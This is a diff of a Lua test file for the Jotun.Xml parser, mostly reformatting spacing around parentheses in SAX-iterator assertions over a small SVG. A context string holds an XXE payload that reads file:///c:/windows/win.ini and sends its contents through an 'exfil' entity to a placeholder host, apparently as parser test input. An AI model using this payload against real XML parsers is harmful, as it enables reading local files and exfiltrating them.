@@ -1,6 +1,6 @@
 -- PACKAGE Jotun.Xml.Tests
 
-local Xml = require ("Jotun.Xml")
+local Xml = require("Jotun.Xml")
 
 local fml = [[
 	<?xml version="1.0" ?>
@@ -24,8 +24,8 @@ local fml = [[
 	<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
 	<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://x.x.x.x:443/?%data;%27%3E%22%3E
 ]]
-return function ()
-	local iterator = Xml.ParseSax (
+return function()
+	local iterator = Xml.ParseSax(
 		[=[
 			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
 			  <path d="M30,1h40l29,29v40l-29,29h-40l-29-29v-40z" stroke="#000" fill="none"/> 
@@ -34,18 +34,18 @@ return function ()
 			</svg>
 		]=]
 	)
-	local tagType, node = iterator ()
-	assert (tagType == Xml.TagType.Opening,     node:ToString ())
-	tagType, node = iterator ()
-	assert (tagType == Xml.TagType.SelfClosing, node:ToString ())
-	tagType, node = iterator ()
-	assert (tagType == Xml.TagType.SelfClosing, node:ToString ())
-	tagType, node = iterator ()
-	assert (tagType == Xml.TagType.Opening,     node:ToString ())
-	tagType, node = iterator ()
-	assert (tagType == Xml.TagType.Text,        node:ToString ())
-	tagType, node = iterator ()
-	assert (tagType == Xml.TagType.Closing,     node:ToString ())
-	tagType, node = iterator ()
-	assert (tagType == Xml.TagType.Closing,     node:ToString ())
+	local tagType, node = iterator()
+	assert(tagType == Xml.TagType.Opening,     node:ToString())
+	tagType, node = iterator()
+	assert(tagType == Xml.TagType.SelfClosing, node:ToString())
+	tagType, node = iterator()
+	assert(tagType == Xml.TagType.SelfClosing, node:ToString())
+	tagType, node = iterator()
+	assert(tagType == Xml.TagType.Opening,     node:ToString())
+	tagType, node = iterator()
+	assert(tagType == Xml.TagType.Text,        node:ToString())
+	tagType, node = iterator()
+	assert(tagType == Xml.TagType.Closing,     node:ToString())
+	tagType, node = iterator()
+	assert(tagType == Xml.TagType.Closing,     node:ToString())
 end
